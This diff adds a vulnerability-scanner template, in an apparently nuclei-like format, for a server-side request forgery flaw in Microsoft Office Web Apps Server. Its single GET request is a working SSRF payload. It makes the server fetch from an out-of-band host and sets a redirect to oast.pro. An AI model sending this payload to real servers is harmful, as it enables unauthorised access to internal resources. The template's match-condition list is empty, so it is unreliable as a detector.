@@ -1,0 +1,16 @@
+id: office-webapps-ssrf
+brief:
+    title: Office Web Apps Server Full Read - Server Side Request Forgery
+    by: DhiyaneshDK
+    level: high
+    about: Office Web Apps Server Full Read is vulnerable to SSRF.
+    label:
+        - microsoft
+        - office-webapps
+        - redirect
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/oh/wopi/files/@/wFileId/contents?wFileId=http://{{oast}}/{{string}}.xlsx%3fbody={{string}}%26header=Location:http://oast.pro%26status=302&access_token_ttl=0'
+      signs: []
